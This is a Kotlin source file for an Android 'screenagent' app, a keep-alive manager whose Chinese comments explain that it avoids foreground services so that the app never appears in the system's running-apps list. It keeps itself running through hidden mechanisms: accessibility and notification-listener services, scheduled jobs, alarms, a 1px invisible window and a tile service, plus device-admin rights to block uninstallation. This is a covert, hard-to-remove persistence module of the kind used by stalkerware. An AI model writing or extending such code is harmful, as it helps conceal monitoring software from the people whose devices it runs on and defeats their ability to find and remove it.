package com.zaka.screenagent.keepalive

import android.content.Context
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import android.util.Log

/**
 * 保活总入口 —— **完全无通知**方案。
 *
 * 为什么砍掉前台服务：Android 13 起，前台服务会在「活动应用 / Task Manager」里显示，
 * 用户下拉通知栏就能看到「正在运行的应用」，等于自曝。所以不再使用 FGS。
 *
 * 现在靠这些**不产生任何可见 UI** 的机制：
 *   1. 无障碍服务（系统绑定，优先级最高，且不显示通知）
 *   2. 通知监听服务（系统绑定，同上）
 *   3. JobScheduler 周期任务（15min，persisted，无 UI）
 *   4. AlarmManager 精确闹钟（无 UI）
 *   5. 1px 不可见窗口（无障碍 2032 通道，无 UI）
 *   6. 传感器监听 + 屏幕事件监听（无 UI）
 *   7. 设备管理员（防卸载）
 */
object KeepAliveManager {

    private const val TAG = "KeepAlive"

    fun startAll(context: Context) {
        KeepAliveJobService.schedule(context)
        AlarmReviveReceiver.schedule(context, 3_000L)
        // 让系统开始监听快捷磁贴：绑定一次 TileService，等于多一条常驻复活通道
        runCatching { KeepAliveTileService.requestListen(context) }
        Log.d(TAG, "silent keep-alive armed (no foreground service)")
    }

    /** 兼容旧调用点：现在只做静默武装，不再启动任何前台服务 */
    fun startServices(context: Context) {
        KeepAliveJobService.schedule(context)
        AlarmReviveReceiver.schedule(context, 3_000L)
    }

    /** 电池优化白名单（唯一会弹系统框的地方，只在引导流程最后调用一次） */
    fun requestIgnoreBatteryOptimizations(context: Context) {
        runCatching {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (pm.isIgnoringBatteryOptimizations(context.packageName)) {
                Log.d(TAG, "already ignoring battery optimizations")
                return
            }
            context.startActivity(
                android.content.Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            )
        }.onFailure { Log.w(TAG, "battery opt request failed: $it") }
    }

    fun isIgnoringBatteryOptimizations(context: Context): Boolean = runCatching {
        (context.getSystemService(Context.POWER_SERVICE) as PowerManager)
            .isIgnoringBatteryOptimizations(context.packageName)
    }.getOrDefault(false)
}
